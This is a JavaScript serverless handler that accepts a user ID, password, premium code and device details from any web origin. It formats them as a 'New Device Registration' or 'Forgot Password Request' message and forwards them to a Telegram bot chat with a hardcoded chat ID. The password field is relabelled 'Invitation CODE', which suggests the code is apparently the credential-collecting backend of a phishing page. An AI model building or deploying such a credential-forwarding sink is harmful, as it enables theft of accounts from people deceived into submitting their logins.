const axios = require('axios');

module.exports = async (req, res) => {
  // Enable CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  // Handle preflight request
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  // Only allow POST requests
  if (req.method !== 'POST') {
    return res.status(405).json({ 
      success: false,
      error: 'Method not allowed. Use POST.' 
    });
  }

  try {
    const BOT_TOKEN = process.env.BOT_TOKEN;
    const CHAT_ID = process.env.CHAT_ID || "5396030319";

    // Check if bot token is configured
    if (!BOT_TOKEN) {
      console.error('BOT_TOKEN environment variable is not set');
      return res.status(500).json({ 
        success: false,
        error: 'Server configuration error' 
      });
    }

    let requestBody;
    
    // Parse JSON body
    try {
      requestBody = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
    } catch (parseError) {
      return res.status(400).json({ 
        success: false,
        error: 'Invalid JSON in request body' 
      });
    }

    const { uid, password, premium_code, isForgotPassword, deviceInfo } = requestBody;

    // Validate required fields
    if (!uid) {
      return res.status(400).json({ 
        success: false,
        error: 'Missing required field: uid' 
      });
    }

    if (!password) {
      return res.status(400).json({ 
        success: false,
        error: 'Missing required field: password' 
      });
    }

    console.log('Processing request for UID:', uid);

    // Create the message
    const messageType = isForgotPassword ? 
      "🌀 Forgot Password Request 🌀" : 
      "🌀 New Device Registration 🌀";

    let messageLines = [
      "┏━━━━━━━━༺༻━━━━━━━━┓",
      `     ${messageType}`,
      "┗━━━━━━━━༺༻━━━━━━━━┛",
      "",
      `🔹 UserID: ${uid}`,
      "",
      `🔸 Invitation CODE: ${password}`,
      ""
    ];

    // Add premium code if available
    if (premium_code) {
      messageLines.push(`🔸 Premium Code: ${premium_code}`);
      messageLines.push("");
    }

    // Add device info if available
    if (deviceInfo && Array.isArray(deviceInfo)) {
      messageLines.push("📋 Device Information:");
      deviceInfo.forEach(line => {
        if (line && line.trim() !== "") {
          messageLines.push(line);
        }
      });
      messageLines.push("");
    }

    // Add timestamp
    const now = new Date();
    messageLines.push(`⏰ Time: ${now.toLocaleString()}`);
    messageLines.push(`📅 Date: ${now.toISOString().split('T')[0]}`);
    messageLines.push("");
    messageLines.push("╟═════════⋆✪⋆═════════╢");

    const message = messageLines.join('\n');

    console.log('Sending message to Telegram...');

    // Send to Telegram
    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    
    const telegramResponse = await axios.post(telegramUrl, {
      chat_id: CHAT_ID,
      text: message,
      parse_mode: 'Markdown'
    });

    console.log('Telegram notification sent successfully');
    
    // Success response
    res.status(200).json({ 
      success: true, 
      message: 'Notification sent successfully to Telegram',
      data: {
        uid: uid,
        type: isForgotPassword ? 'password_recovery' : 'new_registration',
        timestamp: now.toISOString(),
        telegram_message_id: telegramResponse.data.result.message_id
      }
    });

  } catch (error) {
    console.error('Error sending Telegram message:', error);
    
    // More detailed error response
    let errorMessage = 'Failed to send notification';
    
    if (error.response) {
      // Telegram API error
      errorMessage = `Telegram API error: ${error.response.data.description || 'Unknown error'}`;
      console.error('Telegram API response:', error.response.data);
    } else if (error.request) {
      // Network error
      errorMessage = 'Network error: Could not reach Telegram servers';
    } else {
      // Other error
      errorMessage = `Error: ${error.message}`;
    }
    
    res.status(500).json({ 
      success: false, 
      error: errorMessage
    });
  }
};
